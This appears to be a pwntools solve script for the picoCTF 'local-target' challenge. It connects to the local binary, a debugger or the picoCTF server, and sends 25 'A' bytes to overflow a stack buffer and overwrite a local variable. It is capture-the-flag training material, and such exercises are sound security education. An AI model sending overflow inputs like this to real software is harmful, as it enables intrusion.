#!/usr/bin/env python3

from pwn import *

elf = ELF("./local-target_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 61773)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'string:', b'A'*25)

    io.interactive()

if __name__ == "__main__":
    main()
